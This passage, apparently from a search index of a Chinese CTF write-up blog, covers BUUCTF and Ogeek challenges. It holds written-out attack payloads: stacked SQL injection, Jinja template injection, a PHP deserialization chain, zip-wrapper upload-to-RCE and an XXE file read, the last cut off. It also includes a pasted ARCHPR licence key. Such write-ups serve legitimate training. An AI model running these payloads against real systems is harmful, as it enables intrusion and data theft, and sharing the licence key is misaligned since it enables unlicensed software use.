\u5728\u8fd9\u4e2a\u7c7b\u4e2d\u6700\u540e\u9500\u6bc1\u7684\u65f6\u5019\u4f1a\u8c03\u7528 $this->checker\u7684index \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c06 $this->checker \u8986\u76d6\u4e3a\u7c7bProfile\uff0c\u90a3\u4e48\u52bf\u5fc5\u5728\u8c03\u7528index()\u65b9\u6cd5\u65f6\uff0c\u4f1a\u89e6\u53d1call\u51fd\u6570\uff1a 1 2 3 4 5 6 public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u800c\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f1a\u89e6\u53d1 $this->index ,\u6210\u529f\u5c1d\u8bd5\u8c03\u7528\u7c7bProfile\u4e2d\u4e0d\u5b58\u5728\u7684\u5bf9\u8c61\uff0c\u4e8e\u662f\u53ef\u89e6\u53d1__get\u9b54\u6cd5\u65b9\u6cd5\uff0c\u4ece\u800c\u53d8\u6210 return $this->except['index']; \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u6784\u9020\u5e8f\u5217\u5316\u65f6\uff0c\u5c06except\u8d4b\u503c\u4e3a\u6570\u7ec4\uff0c\u5982\u4e0b\uff1a 1 public $except=array('index'=>'upload_img'); \u4e0d\u8fc7\u8fd9\u9898\u8bd5\u4e86\u597d\u591a\u6b21\u8fd8\u662f\u6ca1\u6210\u529f \u5e08\u5085\u7684 \u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684 \u53c2\u8003 \u00b6 \u53c2\u8003 BUUCTF FLAG","title":"BUUCTF"},{"location":"writeup/BUUCTF/#buuctf","text":"","title":"BUUCTF"},{"location":"writeup/BUUCTF/#_1","text":"\u6709\u8fc7\u6ee4\uff1a sqlmap \u53ef\u4ee5\u629b\u51fa\u6570\u636e\u5e93\u540d \u4f46\u662f\u8868\u540d\u6ca1\u6cd5\u5217\u51fa \u5806\u53e0\u6ce8\u5165 get 1' or 1=1 1'; show databases; # 1'; show tables# 1'; show columns from 1919810931114514# \u6709\u4e00\u4e2aflag\u7684\u5b57\u6bb5\u4f46\u662f\u4f60\u67e5\u4e0d\u51fa\u6765 \u63a5\u4e0b\u6765\u770b words \u4ed6\u65e2\u7136\u6ca1\u8fc7\u6ee4 alert \u548c rename\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u628a\u8868\u6539\u4e2a\u540d\u5b57\uff0c\u518d\u7ed9\u5217\u6539\u4e2a\u540d\u5b57\u5462\u3002 \u5148\u628a words \u6539\u540d\u4e3a words1\uff0c\u518d\u628a\u8fd9\u4e2a\u6570\u5b57\u8868\u6539\u540d\u4e3a words\uff0c\u7136\u540e\u628a\u65b0\u7684 words \u91cc\u7684 flag \u5217\u6539\u4e3a id \uff08\u907f\u514d\u4e00\u5f00\u59cb\u65e0\u6cd5\u67e5\u8be2\uff09\u3002 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u76f4\u63a5\u67e5\u8be2\u51fa flag \u4e86\u3002 1 2 3 4 .\u6784\u9020 payload \u5982\u4e0b\uff0c\u7136\u540e\u8bbf\u95ee\uff0c\u770b\u5230\u8fd9\u4e2a\u770b\u6765\u5c31\u6267\u884c\u5230\u6700\u540e\u4e00\u4e2a\u8bed\u53e5\u4e86\u3002\uff08\u6539\u8868\u540d\u90a3\u91cc\u76f4\u63a5\u4ece pma \u62f7\u4e86\u4e00\u4e2a\u8bed\u53e5\u8fc7\u6765\u6539- -\uff09 /?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;# /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# \u7136\u540eflag\u5c31\u51fa\u6765\u4e86","title":"\u968f\u4fbf\u6ce8"},{"location":"writeup/BUUCTF/#flag","text":"\u4e00\u5f20\u56fe\u7247 zsteg \u5de5\u5177\u5206\u6790\uff1a \u6709\u63d0\u793azip\u6587\u4ef6 \u63d0\u53d6\u51fa\u6765 zsteg 42011487927629132.png -E b1,rgb,lsb,xy > out \u5c1d\u8bd5\u89e3\u538b\u63d0\u53d6\u51fa\u6765\u7684\u95ee\u9898\u63d0\u793a\u62a5\u9519 \u4e00\u822c\u7528winrar\u89e3\u538b\u7f29\u9519\u8bef\u7684\u90fd\u53ef\u4ee5\u75287z\u89e3\u538b\u7f29 \u7136\u540e\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a elf \u683c\u5f0f\u7684\u6587\u4ef6 \u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230flag","title":"FLAG"},{"location":"writeup/BUUCTF/#_2","text":"\u76f4\u63a5\u4e0a zsteg \u5de5\u5177","title":"\u955c\u5b50\u91cc\u9762\u7684\u4e16\u754c"},{"location":"writeup/BUUCTF/#ningen-misc","text":"\u6709\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u4f46\u662f\u6ca1\u6709\u7206\u7834\u51fa\u5bc6\u7801","title":"ningen |MISC"},{"location":"writeup/BUUCTF/#rar-misc","text":"\u5b66\u4e60\u4e00\u4e9b\u5982\u4f55\u7206\u7834\u538b\u7f29\u5305 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u957f\u5ea6\u4e3a\u591a\u5c11\u4e86 \u4f46\u662f\u7206\u7834\u633a\u6162\u7684\uff0c\u627e\u4e86\u4e00\u4e2a\u6ce8\u518c\u7801 **ARCHPRP-GSVMT-66892-GKVMB-52992** \u4e0d\u8fc7\u8fd8\u662f\u5f88\u6162\u662f\u4e3a\u5565\uff1f\uff1f","title":"rar | MISC"},{"location":"writeup/BUUCTF/#shrine-web","text":"\u5728BUUCTF\u4e0a\u627e\u5230\u4e86\u8fd9\u9898\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) \u7531\u4e8e\u77e5\u9053\u4e86\u601d\u8def\u5229\u7528\u8d77\u6765\u4e5f\u5f88\u7b80\u5355\u4e86 1 url_for.__globals__.current_app.config \u5c31\u53ef\u4ee5\u4e86","title":"shrine | web"},{"location":"writeup/BUUCTF/#misc","text":"\u4f3c\u4e4e\u5c31\u662fbugku\u7684\u4e00\u9053\u9898 \u4e3b\u8981\u662f\u8fd9\u4e32\u7f16\u7801\u5982\u4f55\u5904\u7406 \u5148\u8f6c\u6362\u4e3aASCII\u7801 \u7136\u540e\u7528notepad++\u6253\u5f00\u66ff\u6362\u6389 (,) \u66ff\u6362\u7684\u90a3\u4e2a\u4ec0\u4e48\u90fd\u4e0d\u586b\u5c31\u884c kali\u4e2d\u4f7f\u7528 gnuplot \u753b\u56fe plot \"aaa.txt\" \u6211\u7528WSL\u5931\u8d25\u4e86","title":"\u6885\u82b1\u9999\u81ea\u82e6\u5bd2\u6765 | MISC"},{"location":"writeup/BUUCTF/#flag-misc","text":"\u56fe\u7247\u91cc\u9762\u6709\u4e1c\u897f \u4e0d\u77e5\u9053\u4e3a\u5565\u538b\u7f29\u5305\u91cc\u7684\u5185\u5bb9\u76f4\u63a5\u88ab\u641e\u51fa\u6765\u4e86\uff0c\u672c\u6765\u8fd8\u4ee5\u4e3a\u662f\u660e\u6587\u653b\u51fb\u7684 \u7136\u540estrings\u627e\u4e00\u4e0b\uff0c\u89e3\u7801\u51d1\u9f50flag flag{N7F5_AD5_i5_funny!}","title":"\u9762\u5177\u4e0b\u7684flag | MISC"},{"location":"writeup/BUUCTF/#webshell-misc","text":"\u7528d\u76fe\u626b\u63cf\u5c31\u884c \u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u77e5\u9053flag\u5728\u54ea\u3002\u3002 \u4e0d\u8fc7\u8ba4\u8bc6\u4e86D\u76fe\u8fd9\u4e2a\u597d\u5de5\u5177","title":"webshell | MISC"},{"location":"writeup/BUUCTF/#misc_1","text":"binwalk\uff0cstrings\uff0cforemost\u90fd\u8bd5\u4e86\u4e00\u904d\u90fd\u6ca1\u6548\u679c\u3002\u3002 \u539f\u6765\u662f\u8def\u7531\u5668\u7684\u4e1c\u4e1c \u53bb\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a\u5de5\u5177 flag\u5c31\u662f\u7528\u6237\u540d","title":"\u8377\u5170\u3002\u3002\u6570\u636e\u6cc4\u9732 | MISC"},{"location":"writeup/BUUCTF/#misc_2","text":"\u76f4\u63a5\u5bfc\u51faHTTP \u7136\u540e\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u56fe\u7247\u85cf\u5f97\u6bd4\u8f83\u6df1 \u53c2\u8003","title":"\u6570\u636e\u5305\u4e2d\u7684\u7ebf\u7d22 | MISC"},{"location":"writeup/BUUCTF/#upload-web","text":"\u8fd9\u662fqwb\u7684\u4e00\u9053\u9898\u76ee\uff0c\u91cd\u70b9\u8003\u5bdfpop\u94fe\u7684\u6784\u9020\uff0c\u7531\u4e8e\u81ea\u5df1tc\u5bfc\u81f4\u6ca1\u80fd\u641e\u51fa\u6765 \u53c2\u8003\u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684\u6587\u7ae0\u5206\u6790\u4e00\u6ce2 \u5728 web/controller/Profile.php \u770b\u5230\u5173\u952e\u51fd\u6570\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public function upload_img(){ if($this->checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; $this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)){ @copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img();}else{ $this->error('Forbidden type!', url('../index'));} } else{ $this->error('Unknow file type!', url('../index')); } } upload_img \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c $this->ext \u4e3atrue\u5c31\u4f1a\u5c06\u6587\u4ef6\u6539\u540d\uff0c\u800c $this->filename_tmp \u548c $this->filename \u90fd\u53ef\u4ee5\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u76f4\u63a5\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u9664\u6cd5\u8fd9\u4e2a upload_img \u51fd\u6570 \u53ef\u4ee5\u5229\u7528\u7684\u70b9\u81ea\u7136\u662fcookie\u4e2d\u7684\u53cd\u5e8f\u5217\u5316 \u627e\u5230\u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u901a\u8fc7\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u53ef\u4ee5\u89e6\u53d1 __call \u7136\u540e $this->{$name} \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u65f6\u53ef\u4ee5\u89e6\u53d1 __get \u90a3\u4e48\u5bfb\u627e\u89e6\u53d1\u65b9\u5f0f\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6 web/controller/Register.php \uff0c\u5173\u952e\u90e8\u5206\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Register extends Controller { public $checker; public $registed; public function __construct() { $this->checker=new Index(); } public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } \u5728\u8fd9\u4e2a\u7c7b\u4e2d\u6700\u540e\u9500\u6bc1\u7684\u65f6\u5019\u4f1a\u8c03\u7528 $this->checker\u7684index \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c06 $this->checker \u8986\u76d6\u4e3a\u7c7bProfile\uff0c\u90a3\u4e48\u52bf\u5fc5\u5728\u8c03\u7528index()\u65b9\u6cd5\u65f6\uff0c\u4f1a\u89e6\u53d1call\u51fd\u6570\uff1a 1 2 3 4 5 6 public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } \u800c\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f1a\u89e6\u53d1 $this->index ,\u6210\u529f\u5c1d\u8bd5\u8c03\u7528\u7c7bProfile\u4e2d\u4e0d\u5b58\u5728\u7684\u5bf9\u8c61\uff0c\u4e8e\u662f\u53ef\u89e6\u53d1__get\u9b54\u6cd5\u65b9\u6cd5\uff0c\u4ece\u800c\u53d8\u6210 return $this->except['index']; \uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u6784\u9020\u5e8f\u5217\u5316\u65f6\uff0c\u5c06except\u8d4b\u503c\u4e3a\u6570\u7ec4\uff0c\u5982\u4e0b\uff1a 1 public $except=array('index'=>'upload_img'); \u4e0d\u8fc7\u8fd9\u9898\u8bd5\u4e86\u597d\u591a\u6b21\u8fd8\u662f\u6ca1\u6210\u529f \u5e08\u5085\u7684 \u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684","title":"upload| web"},{"location":"writeup/BUUCTF/#_3","text":"\u53c2\u8003 BUUCTF FLAG","title":"\u53c2\u8003"},{"location":"writeup/Bypassing/","text":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up \u00b6 \u8fd9\u7bc7\u6587\u7ae0\u5229\u7528\u4e86zip\u4f2a\u534f\u8bae\u5b9e\u73b0\u4e86RCE\uff0c\u601d\u8def\u5f88\u68d2 \u4e0a\u4f20\u6587\u4ef6\u8bd5\u9519\uff1a Upload a true JPEG image file with an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename in an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename with a 100\u00d7100 ppi dimension. Error: Failed to load image Upload a true PNG image file in an arbitrary dimension. Error: Invalid image dimensions Upload a true PNG image file in with 100\u00d7100 pixels dimension. Passed When the application accepts the file it renames it to an apparently random filename and appends the .png extension to the file inside the \u201cuploads\u201d directory, as shown below: \u4e0a\u4f20\u4e4b\u540e\u4f1a\u6709\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6\u540d\u52a0.png\u540e\u7f00 \u5e78\u8fd0\u7684\u662f\u901a\u8fc7\u4f2a\u9020MIME\u53ef\u4ee5\u7ed5\u8fc7\uff1a \u65e0\u6cd5\u6267\u884c \u5c1d\u8bd5\u96f6\u5b57\u8282\u622a\u65ad\uff0c\u5df2\u7ecf\u88ab\u4fee\u590d I tried the obvious Null Byte Injection by appending quite a few encoded variations of the \u201c%00\u201d string to the filename on the \u201cupload\u201d and \u201cview\u201d functionalities of the application to overcome this limitation but after a while I\u2019ve noticed that the server was running PHP v5.5.9 by relying on the X-Powered-By header highlighted on the server response above, which is not vulnerable to this over a decade old widely known vulnerability . This got me stuck for a while, when I took a step back to see what I could have missed. A server response while attempting a basic LFI got my attention: \u672c\u5730\u6587\u4ef6\u5305\u542b\u5c1d\u8bd5\u5931\u8d25 After a series of attempts to bypass this active filtering, I ended up trying the PHP Filter trick in order to successfully achieve LFI: \u83b7\u53d6\u5230\u6e90\u7801\uff1a PHP comes by default with several built-in wrappers for various URL-style protocols for use with the filesystem functions. Among those there are the compression wrappers such as zip:// . This wrapper could allow one to unzip archives on the fly while providing access to the files stored in the archive. So if you abuse that LFI with a URL-style protocol such as zip://archive.zip#file.php you could potentially bypass this restrictions imposed by the code by uploading a ZIP archive with your PHP code inside of it and then executing it. Let\u2019s see how this could work on our scenario, step-by-step: First we set a very simple PHP script. It will take from the $_GET superglobal parameters that were sent in HTTP request using GET method. The \u201cparam1\u201d and \u201cparam2\u201d will be interpreted respectively as a function name and arguments for the function to be executed. Next step is to create a ZIP archive containing our PHP script: Then we upload this file to the server by using the aforementioned trick of tampering with the Content-type. Now we can easily achieve RCE abusing the wrapper: There\u2019s an actual flag file located on the server to defeat this challenge which will be left as a trivial exercise to the reader :)","title":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up"},{"location":"writeup/Bypassing/#bypassing-php-null-byte-injection-protections-part-ii-ctf-write-up","text":"\u8fd9\u7bc7\u6587\u7ae0\u5229\u7528\u4e86zip\u4f2a\u534f\u8bae\u5b9e\u73b0\u4e86RCE\uff0c\u601d\u8def\u5f88\u68d2 \u4e0a\u4f20\u6587\u4ef6\u8bd5\u9519\uff1a Upload a true JPEG image file with an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename in an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename with a 100\u00d7100 ppi dimension. Error: Failed to load image Upload a true PNG image file in an arbitrary dimension. Error: Invalid image dimensions Upload a true PNG image file in with 100\u00d7100 pixels dimension. Passed When the application accepts the file it renames it to an apparently random filename and appends the .png extension to the file inside the \u201cuploads\u201d directory, as shown below: \u4e0a\u4f20\u4e4b\u540e\u4f1a\u6709\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6\u540d\u52a0.png\u540e\u7f00 \u5e78\u8fd0\u7684\u662f\u901a\u8fc7\u4f2a\u9020MIME\u53ef\u4ee5\u7ed5\u8fc7\uff1a \u65e0\u6cd5\u6267\u884c \u5c1d\u8bd5\u96f6\u5b57\u8282\u622a\u65ad\uff0c\u5df2\u7ecf\u88ab\u4fee\u590d I tried the obvious Null Byte Injection by appending quite a few encoded variations of the \u201c%00\u201d string to the filename on the \u201cupload\u201d and \u201cview\u201d functionalities of the application to overcome this limitation but after a while I\u2019ve noticed that the server was running PHP v5.5.9 by relying on the X-Powered-By header highlighted on the server response above, which is not vulnerable to this over a decade old widely known vulnerability . This got me stuck for a while, when I took a step back to see what I could have missed. A server response while attempting a basic LFI got my attention: \u672c\u5730\u6587\u4ef6\u5305\u542b\u5c1d\u8bd5\u5931\u8d25 After a series of attempts to bypass this active filtering, I ended up trying the PHP Filter trick in order to successfully achieve LFI: \u83b7\u53d6\u5230\u6e90\u7801\uff1a PHP comes by default with several built-in wrappers for various URL-style protocols for use with the filesystem functions. Among those there are the compression wrappers such as zip:// . This wrapper could allow one to unzip archives on the fly while providing access to the files stored in the archive. So if you abuse that LFI with a URL-style protocol such as zip://archive.zip#file.php you could potentially bypass this restrictions imposed by the code by uploading a ZIP archive with your PHP code inside of it and then executing it. Let\u2019s see how this could work on our scenario, step-by-step: First we set a very simple PHP script. It will take from the $_GET superglobal parameters that were sent in HTTP request using GET method. The \u201cparam1\u201d and \u201cparam2\u201d will be interpreted respectively as a function name and arguments for the function to be executed. Next step is to create a ZIP archive containing our PHP script: Then we upload this file to the server by using the aforementioned trick of tampering with the Content-type. Now we can easily achieve RCE abusing the wrapper: There\u2019s an actual flag file located on the server to defeat this challenge which will be left as a trivial exercise to the reader :)","title":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up"},{"location":"writeup/Ogeek/","text":"Ogeek \u00b6 Web \u00b6 Enjoy your self \u00b6 \u6253\u5f00\u4e4b\u540e\u662f\u8fd9\u6837\u4e00\u4e2a\u9875\u9762\uff0c\u63d0\u793a time is money \u731c\u6d4b\u662f\u7ade\u4e89 \u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <center><img src=\"../../welcome.png\"></center> <br/> <br/> <?php error_reporting ( 0 ); include \"../../utils/utils.php\" ; if ( isset ( $_REQUEST [ 'filename' ]) and preg_match ( \"/^\\w{8}$/\" , $_REQUEST [ 'filename' ])){ $filename = strtolower ( $_REQUEST [ 'filename' ]); touch ( \"backup/ { $filename } .txt\" ); unlink ( glob ( \"backup/*\" )[ 0 ]); } else { highlight_file ( __FILE__ ); } ?> \\w \u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u7b49\u540c\u4e8e [a-zA-Z0-9_] \u6240\u4ee5\u6b64\u5904\u6b63\u5219\u7684\u542b\u4e49\u5c31\u662f\u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u5f00\u5934\u7684\u6587\u4ef6\u540d\u3002 touch \u4f1a\u91cd\u65b0\u8bbe\u5b9a\u6587\u4ef6\u7684\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa\u3002 unlink \u51fd\u6570\u5220\u9664\u6587\u4ef6\uff0c\u6210\u529f\u65f6\u8fd4\u56de TRUE \uff0c \u6216\u8005\u5728\u5931\u8d25\u65f6\u8fd4\u56de FALSE \u3002 glob \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u6700\u540e\u4e00\u53e5 unlink(glob(\"backup/*\")[0]); \u5f88\u5173\u952e\uff0c\u4f60\u9700\u8981\u77e5\u9053 glob \u5217\u51fa\u7684\u6587\u4ef6\u987a\u5e8f\u662f\u600e\u6837\u7684\uff0c\u8fd9\u91cc\u8981\u8c03\u8bd5\u4e00\u4e0b \u8fd9\u91cc\u5148\u68c0\u67e5\u4e86 filename \u662f\u4e0d\u662f\u516b\u4f4d \u5927\u5c0f\u5199\u5b57\u6bcd\u6216\u8005\u6570\u5b57\u6216\u8005\u4e0b\u5212\u7ebf\u3002\u662f\u7684\u8bdd\u5c31\u521b\u5efa\u4e00\u4e2a\u8fd9\u4e2a\u540d\u5b57\u7684\u6587\u4ef6\u3002\u7136\u540e\u518d\u5217\u6587\u4ef6\uff0c\u5220\u9664\u5217\u51fa\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u8fd9\u91cc\u6709\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u8981\u662f\u5b58\u5728\u5176\u4ed6\u6587\u4ef6\uff0c\u90a3\u5217\u51fa\u6765\u7684\u5c31\u662f\u90a3\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u5220\u4e86\uff0c\u5c31\u6b64\u90a3\u5c31\u53ef\u4ee5\u63a8\u6d4b\u51fa\u90a3\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u4e86\u3002 \u6211\u4eec\u5728\u672c\u5730\u505a\u4e2a\u5b9e\u9a8c\uff0c\u6765\u5c55\u793a\u4e00\u4e0b\u6211\u4eec\u8981\u5220\u9664\u7684\u6587\u4ef6\u3002 \u7136\u540e\u5728 backup \u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c31\u53eb abcdabcd \u5427\u3002 \u7136\u540e\u8bbf\u95ee\u8bd5\u8bd5 /?filename=abcdabcd\u3002 \u8fd9\u4e2a\u6587\u4ef6\u88ab\u5220\u4e86\uff0c\u4f46\u7a0b\u5e8f\u521b\u5efa\u7684abcdabcd.txt \u8fd8\u5b58\u5728\u3002 \u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\u5199\u4e2a\u811a\u672c\uff0c\u6765\u73a9\u73a9\u4eba\u8089\u4e8c\u5206\u6cd5\u5427\u3002 1 2 3 4 5 6 7 8 9 10 11 import requests filename = \"zzzzzzzz\" while True : print ( requests . get ( \"http://47.107.255.20:18088/users/977acc6365a9bc4f1c56accf1331a3bb/\" , params = { \"filename\" : filename }) . text ) r = requests . get ( \"http://47.107.255.20:18088/users/ 977acc6365a9bc4f1c56accf1331a3bb/backup/\" + filename + \".txt\" ) print ( r . status_code ) if r . status_code != 404 : print ( filename ) exit ( 0 ) \u4ece\u53ef\u7528\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4f4d\u5f00\u59cb\u3002\u6d4b\u4e86\u4e0b\u670d\u52a1\u5668\u4f3c\u4e4e\u662f\u6709\u5b9a\u65f6\u91cd\u7f6e\u8fd8\u662f\u5565\u7684\u3002\u6240\u4ee5\u9700\u8981\u591a\u6b21\u5c1d\u8bd5\uff0c\u6709\u4e00\u6b21 200 \u5c31\u8bf4\u660e\u90a3\u4e2a\u6587\u4ef6\u7684\u5b57\u5178\u5e8f\u5728\u524d\u9762\u4e86\u3002 azzzzzzz\u8fd4\u56de 200\uff0c\u8bf4\u660e\u6587\u4ef6\u8fd8\u5728\u524d\u9762\u3002 \u5982\u6b64\u5f80\u590d\uff0c\u8dd1\u51fa\u524d\u4e03\u4f4d\u5b57\u7b26 aefebab\u3002\u7701\u7565\u3002\u3002\u3002\u90a3\u5c31\u8bf4\u660e\u6587\u4ef6\u540d\u662f aefebab8 \u4e86\u3002\u6253\u5f00\u770b\u770b\uff0c\u679c\u7136\u6709\u4e1c\u897f\u3002 \u8bbf\u95ee\u4e4b\u540e\u6709\u4e1c\u897f\uff1a \u53c2\u8003\u5e08\u5085\u7684\u597d\u4e86\u73af\u5883\u6ca1\u4e862333 Look around \u00b6 \u663e\u793a\u65f6\u95f4 \u6e90\u4ee3\u7801\u4e2d\u6709 js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 setInterval ( jishi , 1000 ); function jishi (){ var iTime = new Date (); var iYear = iTime . getFullYear (); var iMonth = iTime . getMonth (); var iDate = iTime . getDate (); var iDay = iTime . getDay (); var iHour = iTime . getHours (); var iMinute = iTime . getMinutes (); var iSecond = iTime . getSeconds (); var aPic = document . getElementsByClassName ( 'timePic' ); if ( iDay == '0' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e6\u2014\u00a5' ; } else if ( iDay == '1' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u20ac' ; } else if ( iDay == '2' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u0152' ; } else if ( iDay == '3' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u2030' ; } else if ( iDay == '4' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u203a\u203a' ; } else if ( iDay == '5' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u201d' ; } else { iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u2026\u00ad' ; } var strNew = ChangeTime ( iHour ) + '' + ChangeTime ( iMinute ) + '' + ChangeTime ( iSecond ); //\u00e8\u00bd\u00ac\u00e6\u008d\u00a2\u00e4\u00b8\u00ba\u00e5\u00ad\u2014\u00e7\u00ac\u00a6\u00e4\u00b8\u00b2 for ( var i = 0 ; i < 6 ; i ++ ){ aPic [ i ]. src = 'img/' + strNew . charAt ( i ) + '.JPG' ; } } function ChangeTime ( obj ){ return obj < 10 ? ( '0' + obj ) : obj ; } \u5176\u4e2d\u8fd8\u6709\u4e00\u4e9b\u4e71\u7801 \u8def\u7531 <http://47.107.253.140:18080/webserver/js/_.js> \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a 1 2 3 4 5 var data = \"<?xml version=\\\"1.0\\\" ?>\\n<request>\\n <status>1</status>\\n</request>\" ; setInterval ( function (){ $ . post ( \"callback\" , data ); }, 10000 ); \u4f20\u9001\u7684\u6570\u636e\u5c31\u662f xml \u6293\u5305 \u4e0d\u65ad\u5730\u53d1\u9001 callback \u4e0d\u80fd\u89e3\u6790PHP\u534f\u8bae \u770b\u6765\u662f\u6709XXE\u7684\u53ef\u80fd\u4e86\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u641e \u7a81\u7136\u53d1\u73b0java\u652f\u6301\u7684\u534f\u8bae\u8fd8\u633a\u591a\u7684 \u4f46\u662f\u5e76\u6ca1\u6709\u4efb\u4f55\u56de\u663e \u4ee5\u4e0b\u662f\u6b63\u89e3 localDTD \u901a\u8fc7 localDTD \u6765\u76f2\u6253xxe \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u53bbLinux\u91cc\u9762\u5168\u5c40\u641c\u7d22\u4e00\u4e2aDTD\u6587\u4ef6\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % condition 'aaa)> aaa)> <!ENTITY &#x25; file SYSTEM \"file:///flag\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM 